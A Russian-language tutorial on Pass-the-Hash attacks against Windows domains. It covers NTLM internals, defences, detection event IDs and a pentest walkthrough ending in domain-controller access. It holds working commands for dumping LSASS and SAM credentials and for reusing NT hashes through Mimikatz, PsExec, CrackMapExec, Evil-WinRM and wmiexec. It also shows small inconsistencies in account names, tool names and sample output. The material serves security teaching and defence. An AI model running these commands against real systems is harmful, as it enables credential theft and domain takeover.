# Pass-the-Hash: повторное использование NTLM-хеша для горизонтального перемещения

## 1. Сущность Pass-the-Hash и его место в ландшафте атак на Windows-среды
Pass-the-Hash (PtH) — это техника, позволяющая злоумышленнику пройти аутентификацию на удалённой системе под учётной записью пользователя, используя не пароль в открытом виде, а его криптографический хеш. Атака эксплуатирует фундаментальную особенность протокола NTLM: для проверки подлинности серверу достаточно хеша, поэтому хеш функционально эквивалентен паролю. В матрице MITRE ATT&CK техника зарегистрирована как [T1550.002 (Pass the Hash)](https://attack.mitre.org/techniques/T1550/002/) в категории «Use Alternate Authentication Material». Она является ключевым звеном фазы Lateral Movement, превращая локальную компрометацию рабочей станции в полный захват домена Active Directory.

**Контекст применения.** PtH не является изолированной атакой; он почти всегда следует за этапом доступа к учётным данным (Credential Access, техники T1003 — OS Credential Dumping). Как только злоумышленник получает NTLM-хеш привилегированного пользователя с одной машины — например, из памяти процесса LSASS — он может использовать его для аутентификации на любых других хостах, где действителен тот же хеш. Это обеспечивает быстрое горизонтальное перемещение без необходимости расшифровывать пароль или взаимодействовать с доменными службами Kerberos. Особую опасность представляет ситуация, когда хеш локального администратора одинаков на множестве машин или когда в LSASS оседает хеш доменного администратора, ранее выполнившего вход. Именно поэтому в отчётах Verizon DBIR за последние годы неоднократно подчёркивалось, что компрометация учётных данных лежит в основе почти половины всех инцидентов.

Чтобы корректно классифицировать PtH среди других техник, полезно сравнить её с родственными приёмами, также направленными на повторное использование аутентификационного материала в Windows-сетях.

| Техника | Используемый материал | Протокол | Требуется знание пароля | Применимость против Kerberos | Характерный инструмент |
|---------|-----------------------|----------|-------------------------|------------------------------|------------------------|
| **Pass-the-Hash (PtH)** | NTLM-хеш (NT hash) | NTLM | Нет | Нет (если не сработал fallback) | Mimikatz, CrackMapExec |
| **Pass-the-Ticket (PtT)** | Kerberos-билеты (TGT/TGS) | Kerberos | Нет | Да | Mimikatz, Rubeus |
| **Overpass-the-Hash** | NTLM-хеш для запроса TGT | Kerberos (AS-REQ) | Нет | Да (если RC4_HMAC разрешён) | Mimikatz (sekurlsa::pth) |
| **Pass-the-Cache** | Кеш учётных данных в Linux/Unix | Различные | Зависит от кеша | Н/Д | Различные скрипты |

Каждая из этих техник решает одну задачу — избежать необходимости знать открытый пароль, но использует разные механизмы. PtH работает исключительно в контексте NTLM, PtT оперирует украденными билетами Kerberos, а Overpass-the-Hash конвертирует хеш в действующий Kerberos-билет, запрашивая TGT от имени пользователя при поддержке алгоритма RC4-HMAC. Переход от Kerberos к NTLM (fallback) в современных доменах возможен по множеству легитимных причин: обращение по IP-адресу вместо имени хоста, недоступность контроллера домена, работа устаревших служб или приложений, не поддерживающих Kerberos. Именно эти ситуации и эксплуатирует PtH, оставаясь актуальным даже в хорошо управляемых средах с развёрнутым Kerberos.

**Почему хеш равен паролю в мире NTLM.** Ключевая предпосылка PtH — способность протокола NTLM принимать в качестве доказательства подлинности не сам пароль, а его хеш. В современных Windows два основных типа хешей: устаревший LM-hash (DES, фактически нестойкий) и NT-hash (MD4 от Unicode-представления пароля). Именно 16-байтовый NT-hash и используется в атаках Pass-the-Hash. Он вычисляется однократно при создании пароля и хранится в нескольких местах: в базе SAM (локальные учётные записи), в файле NTDS.dit на контроллере домена (доменные учётные записи) и, что критично, в памяти процесса LSASS при любом интерактивном или сетевом входе пользователя. А поскольку хеш не солится (нет дополнительной случайной привязки), два одинаковых пароля всегда дают идентичный NT-hash, и этот хеш остаётся неизменным между сессиями вплоть до смены пароля. Такая статичность и делает кражу хеша столь эффективной.

## 2. Внутреннее устройство: протокол NTLM и механизм повторного использования хеша
Атака PtH — это прямое следствие архитектуры семейства протоколов NT LAN Manager. Понимание того, как работает аутентификация NTLM, необходимо для осознания неустранимости этой уязвимости на уровне протокола.

**Формат NTLM-хеша.** Система хранит два производных пароля:  
- LM-хеш: 16 байт, метод устарел, в Windows 10/11 и Server 2016+ не используется по умолчанию.  
- NT-хеш: результат MD4(UTF-16LE(пароль)). Длина 16 байт, без соли.

Именно NT-хеш используется во всех современных обменах по NTLMv2 и, как будет показано, напрямую в PtH.

**Базовая схема challenge-response.** NTLM-аутентификация представляет собой трёхсторонний диалог между клиентом, сервером и (в доменной среде) контроллером домена. Упрощённый поток для рабочей группы выглядит так:

```text
Клиент                             Сервер
  |                                  |
  |---(1) NEGOTIATE_MESSAGE -------->|
  |                                  |
  |<-(2) CHALLENGE_MESSAGE (8-байт) -|
  |                                  |
  |---(3) AUTHENTICATE_MESSAGE ----->|
  |      (response, вычисленный из   |
  |       хеша и challenge)          |
  |                                  |
  |<-(4) STATUS ---------------------|
```

В доменной конфигурации сервер пересылает сообщения контроллеру домена через Netlogon-протокол, но логика остаётся той же. Клиент вычисляет ответ (response) на основе NTLM-хеша и серверного challenge (nonce). При использовании NTLMv1 ответом является результат тройного DES-шифрования challenge с расширенным ключом, полученным из хеша; в NTLMv2 ответ формируется как HMAC-MD5 от challenge и дополнительного блока (blob), включающего временную метку и другие поля. Ключевой момент: для построения ответа клиенту не нужен пароль — достаточно хеша. Поэтому злоумышленник, владеющий хешем, может вычислить корректный ответ без знания исходного пароля.

**Почему PtH работает.** Сервер (или контроллер домена) тоже не хранит пароль в открытом виде. Он сравнивает полученный ответ с тем, который ожидает, вычисляя его на основе своей копии хеша. Если ответы совпадают, аутентификация успешна. Атакующий просто вставляет полученный ранее NT-хеш в структуры памяти локальной системы и заставляет API аутентификации использовать этот хеш, минуя вызовы, требующие парольную фразу. Таким образом, на протокольном уровне происходит абсолютно легитимный NTLM-обмен, но инициированный внешним инструментом с украденным ключевым материалом.

В таблице ниже сведены различия версий NTLM, влияющие на возможность PtH и усложняющие детектирование.

| Версия протокола | Механизм ответа | Стойкость к перехвату ответа | Уязвимость для PtH | Примечания |
|------------------|----------------|-----------------------------|-------------------|------------|
| NTLMv1           | DES-шифрование challenge (3 блока) | Низкая (легко взломать offline) | Полная — достаточно хеша | Не рекомендуется, отключён в актуальных ОС |
| NTLMv2 (по умолчанию) | HMAC-MD5 от challenge + client blob | Высокая к офлайн-взлому | Полная — хеш позволяет вычислить ответ | Атака PtH работает независимо от усиления протокола, так как хеш всё равно используется |
| NTLMv2 Session Security | Расширенное согласование ключей подписи/шифрования | Высокая | Полная | Добавляет защиту трафика после аутентификации, но не препятствует PtH |

Как видно, совершенствование протокола NTLM не устраняет PtH; оно лишь затрудняет offline-взлом перехваченных хешей и усиляет защиту сессии. Причина в том, что протокол продолжает рассматривать хеш как разделяемый секрет, пригодный для выработки любых сессионных ответов.

**Роль Kerberos и сохраняющиеся лазейки.** В доменах Active Directory основным протоколом аутентификации с версии Windows 2000 выступает Kerberos, который не передаёт даже хеш (взаимодействие через TGT/TGS). Однако NTLM остаётся обязательным для обратной совместимости. Он активируется в таких сценариях:
- подключение к ресурсу по IP-адресу (например, \\192.168.0.10\C$);
- отказ службы в поддержке Kerberos (неправильно настроенный SPN);
- некоторые протоколы, такие как WinRM при определённой конфигурации;
- работа в локальной учётной записи (не доменной).

Это означает, что даже в среде с полностью работоспособным Kerberos атакующий может намеренно вызвать fallback до NTLM, отправив запрос к целевому серверу по IP. Таким образом, PtH остаётся реальной угрозой в любых AD-инфраструктурах, где не применены исчерпывающие ограничения NTLM.

**Необходимые предпосылки для успешного PtH.** Для проведения атаки злоумышленник должен обладать:
1. NT-хешем целевого пользователя (локального или доменного), полученным любым способом;
2. сетевым доступом к удалённому хосту, где этот хеш обладает какими-либо правами;
3. портами SMB (445), WMI (135, 445) или WinRM (5985/5986), доступными для соединения (стандартно в AD);
4. локальными правами администратора на системе-трамплине для модификации памяти LSASS (в случае инструментов, импортирующих хеш напрямую в активный сеанс).

## 3. Применение PtH на практике: извлечение хешей, передача и обнаружение
Реализация атаки PtH в ходе пентеста или реальной атаки разбивается на две фазы: сначала добыча хеша с одной машины (Credential Dumping), затем его использование для входа на другие ресурсы (Pass-the-Hash в узком смысле). Каждая фаза сопряжена с характерными артефактами, позволяющими Blue Team выявлять атаку.

### 3.1. Извлечение хешей из скомпрометированной системы
Наиболее быстрый способ получить NT-хеши — прочитать память процесса LSASS (Local Security Authority Subsystem Service), в которой Windows кеширует учётные данные всех вошедших пользователей, включая NTLM-хеши, Kerberos-билеты и даже в некоторых конфигурациях пароли открытым текстом (при включённом WDigest). Техника описана как MITRE T1003.001 — LSASS Memory. Для этого необходим уровень прав SYSTEM или способность отладки процессов (SeDebugPrivilege).

Типовая цепочка команд с использованием Mimikatz:
```powershell
# Запуск Mimikatz с повышением привилегий
mimikatz # privilege::debug
mimikatz # token::elevate
# Извлечение паролей и хешей из LSASS
mimikatz # sekurlsa::logonpasswords
```
Вывод содержит разделы для каждого аутентификационного провайдера, включая `msv1_0` с полем `NTLM` — искомый NT-hash. Альтернативный способ — создание дампа памяти процесса LSASS с помощью легитимной утилиты Sysinternals ProcDump:
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
Затем полученный дамп переносится на машину атакующего и разбирается тем же Mimikatz в офлайн-режиме:
```powershell
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Второй значимый источник — база SAM, хранящая локальные учётные записи. При наличии прав SYSTEM достаточно выполнить:
```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```
и скопировать файлы на атакующую машину, где секреты извлекаются через `secretsdump.py` из состава Impacket:
```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```
Вывод покажет NT-hash локального администратора, который нередко совпадает на множестве машин из-за шаблонной настройки корпоративных образов.

### 3.2. Передача хеша и создание сессии на удалённом хосте
Получив хеш, атакующий может инициировать аутентификацию на целевой машине. Наиболее распространённые методы:

**А) Использование Mimikatz для внедрения хеша в текущий сеанс.** Команда `sekurlsa::pth` подготавливает access token с указанными учётными данными и открывает doвую консоль:
```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:<32-символьный NT-хеш> /run:cmd.exe
```
После этого любая аутентификация NTLM из этой консоли (например, `dir \\DC01\C$`) автоматически выполняется под переданной учётной записью.

**Б) Удалённое выполнение команд через утилиты, поддерживающие хеш-аутентификацию.** Большинство современных инструментов для внутреннего пентеста принимает NT-хеш в параметре вместо пароля:

- **PsExec из Sysinternals** (ключ `-h` указывает на передачу хеша):
  ```powershell
  PsExec64.exe -accepteula \\192.168.10.50 -u contoso\admin -h -p :<NT-хеш> cmd
  ```
- **CrackMapExec** (комбинированный фреймворк):
  ```bash
  crackmapexec smb 192.168.10.50 -u admin -H <NT-хеш> -x whoami
  ```
- **Evil-WinRM** для управления через WinRM с PtH:
  ```bash
  evil-winrm -i 192.168.10.50 -u Administrator -H <NT-хеш>
  ```
- **wmiexec.py из Impacket**:
  ```bash
  wmiexec.py -hashes :<NT-хеш> Administrator@192.168.10.50
  ```

Все эти механизмы работают на одном принципе: в стек NTLM-аутентификации подставляется украденный хеш, и удалённая служба (SMB, WMI, WinRM) обслуживает сессию от лица пользователя.

**В) Использование Overpass-the-Hash для получения Kerberos-билета.** Если сеть хорошо ограничивает NTLM, та же команда `sekurlsa::pth` в Mimikatz не только внедряет хеш в NTLM-стек, но и инициирует запрос TGT по Kerberos с алгоритмом RC4-HMAC (если хешный ключ разрешён для данного пользователя). После получения TGT можно работать через Kerberos, что делает атаку ещё менее заметной.

### 3.3. Защитные меры и детектирование PtH
Паритет между атакующим и защитником смещается при внедрении комплекса технических и организационных контролей.

**Превентивные меры.**
- **Credential Guard** (изоляция LSASS на базе виртуализации) исключает дамп хешей даже с правами SYSTEM.
- **LAPS** (Local Administrator Password Solution) генерирует уникальный пароль локального администратора для каждой рабочей станции и регулярно его меняет, сводя на нет распространение через одинаковый хеш.
- **Отключение NTLM** через политику «Network security: Restrict NTLM: Block NTLM traffic in this domain» (вплоть до полной блокировки) и настройка брандмауэра на ограничение входящего SMB/WMI из недоверенных сегментов.
- **Режим Restricted Admin для RDP** и ограничения для WinRM ослабляют возможности входа по хешу.
- **Разделение учётных записей** по модели тиров (Tier 0,1,2) — администратор домена никогда не должен входить на обычные рабочие станции.

**Выявление атаки.** Поскольку PtH создаёт полностью легитимные события входа, защита опирается на поиск аномалий. Набор ключевых событий Windows:

- **Event ID 4624** (событие входа). Для PtH характерны типы входа:
  - 3 (Network) — сетевая аутентификация NTLM при доступе к SMB-ресурсам;
  - 9 (NewCredentials) — аутентификация с явными учётными данными, если инструмент использует такие API.
  Отсутствие предшествующего Event 4648 (явные учётные данные) при типе 3 может указывать на прямой вызов NTLM с хешем (хотя не всегда прозрачно).
- **Event ID 4648** — вход с явными учётными данными, фиксирует, какой процесс инициировал аутентификацию с альтернативным логином. Если процесс неожиданный (например, `rundll32.exe` или `cmd.exe` от пользователя не из ИТ-отдела), это подозрительно.
- **Event ID 4672** — назначение привилегий (например, SeDebugPrivilege) новой сессии. Сессия сетевого входа, получившая высокие привилегии, может быть сигналом.
- **Event ID 4776** — контроллер домена подтверждает NTLM-аутентификацию. Анализ частоты и местоположения источника помогает выявить веерные PtH.
- **Нестандартные пути аутентификации.** NTLM-соединение с рабочей станции на другую рабочую станцию (горизонтальный вектор) — самая явная аномалия, так как пользователи обычно обращаются к серверам, а не к равноправным хостам.

Современные EDR-решения (CrowdStrike, Microsoft Defender for Identity) и SIEM-правила коррелируют эти события, выявляя цепочки, характерные для PtH. Дополнительно полезна видимость восточно-западного трафика (East-West) на уровне сети для обнаружения резкого роста NTLM-запросов между рабочими станциями.

## 4. Сквозной практический пример: от рабочей станции до контроллера домена с Pass-the-Hash
**Сценарий:** внутренний пентест домена `research.corp`. Атакующий имеет ограниченный доступ к рабочей станции `WS01` под учётной записью локального администратора (например, через фишинг и эксплуатацию уязвимости). Цель — получить полный контроль над доменом.

### Исходные условия
- Среда: Windows Server 2019. Домен `research.corp`, контроллер `DC01`. Рабочие станции `WS01`, `WS02` под управлением Windows 10, на всех одинаковый пароль локального администратора (типичное упущение).
- Инструменты на машине атакующего (Kali Linux): Impacket, CrackMapExec. На `WS01` загружен mimikatz.exe.
- На `WS01` ранее выполнял вход доменный администратор `corp\admin.da` посредством RDP, его хеш остался в LSASS.

### Шаг 1. Извлечение хешей из LSASS на WS01
Запускаем Mimikatz с правами локального администратора и извлекаем учётные данные:
```powershell
PS C:\temp> .\mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
Token Id  : 0
User      : NT AUTHORITY\SYSTEM
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/15/2026 9:34:12 AM
```

В выводе получаем NTLM-хеш администратора домена `research\admin.da`.

### Шаг 2. Проверка возможности горизонтального перемещения к WS02 с помощью полученного хеша DA
Поскольку доменный администратор имеет доступ ко всем машинам, используем CrackMapExec для проверки прав и выполнения команды:
```bash
root@kali:~# crackmapexec smb 192.168.10.102 -u admin.da -d research.corp -H f1e5b86... --local-auth
SMB         192.168.10.102 445    WS02             [*] Windows 10.0 Build 17763 x64
SMB         192.168.10.102 445    WS02             [+] research.corp\admin.da f1e5b86... (Pwn3d!)
```
Пометка `Pwn3d!` означает административный доступ к хосту WS02 через SMB.

### Шаг 3. Получение интерактивного доступа к WS02 и сбор дополнительных хешей
Запускаем командную оболочку на удалённой машине:
```bash
root@kali:~# impacket-wmiexec -hashes :f1e5b86... research.corp/admin.da@192.168.10.102
[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>
```
Теперь мы на WS02 с правами администратора. Для демонстрации повышения объёма украденных данных повторим кражу учётных записей — вдруг здесь логинились другие привилегированные пользователи. Через сессию WMI выполняем команду для создания дампа LSASS (здесь используем уже установленный procmon для краткости, в реальности можно передать procdump):
```powershell
C:\> procdump -accepteula -ma lsass.exe C:\temp\lsass_ws02.dmp
```
Скачиваем дамп на Kali и анализируем с помощью Mimikatz (тут же можно найти хеш локального администратора, если он был другим). В нашем примере обнаруживаем тот же самый хеш DA.

### Шаг 4. Захват контроллера домена
Имея хеш администратора домена, атакуем DC01. Аутентификация на контроллере домена через WinRM с Pass-the-Hash:
```bash
root@kali:~# evil-winrm -i 192.168.10.10 -u admin.da -H f1e5b86...
Evil-WinRM shell v3.4
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\admin.da\Documents>
```
Теперь у нас PowerShell-сессия на контроллере домена. Возможно дальнейшее извлечение NTDS.dit, создание постоянных бэкдоров или полное управление доменом.

**Вывод.** Пример иллюстрирует классическую трёхшаговую траекторию PtH: компрометация начальной рабочей станции → кража хеша привилегированного пользователя из LSASS → использование хеша для перехода на соседние системы вплоть до контроллера домена. Ключевая уязвимость — нахождение доменного администратора в памяти обычной рабочей станции и возможность беспрепятственного использования его NT-хеша для NTLM-аутентификации. На практике атака может быть остановлена применением Credential Guard, уникальных локальных паролей через LAPS и сегментацией сети, блокирующей east-west трафик.
